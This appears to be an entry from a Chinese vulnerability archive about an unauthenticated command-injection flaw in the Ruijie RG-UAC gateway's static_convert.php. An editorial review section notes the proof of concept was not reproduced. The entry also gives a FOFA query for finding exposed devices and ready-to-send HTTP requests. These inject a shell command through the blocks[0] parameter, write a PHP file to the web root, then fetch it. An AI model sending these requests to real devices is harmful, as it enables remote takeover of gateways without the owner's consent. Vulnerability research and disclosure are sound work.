---
source: "wy876 漏洞文库"
id: "vw-3d690dcc751b8ac781a74112"
entity_id: "ve-3d690dcc751b8ac781a74112"
schema_version: "1"
title: "锐捷RG-UAC应用网关static_convert.php前台RCE漏洞"
product: "Ruijie RG-UAC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie，绝对Web目录可写且PHP解析；固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3static_convert.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ofaghdl3fyqnfsf3"
source_status: "recorded"
---

# 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie RG-UAC
- 本文讨论：static_convert.php blocks[0]命令注入
- 版本、权限与配置前提：无Cookie，绝对Web目录可写且PHP解析；固件未知
- 资料类型：前台命令注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求含未完整编码尖括号/引号/数组键，应区分展示与实际编码
- 写固定ceshi.php并执行后自删，未示响应/hash，成功性未证
- 绝对/var/www/html路径不是所有部署通用
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 型号固件、匿名及Web根路径待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关static_convert.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：


### 四、漏洞复现
```http
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20echo%20md5("666");unlink(__FILE__);?>%27%20>/var/www/html/ceshi.php HTTP/1.1
Host:
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


```http
GET /ceshi.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ofaghdl3fyqnfsf3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
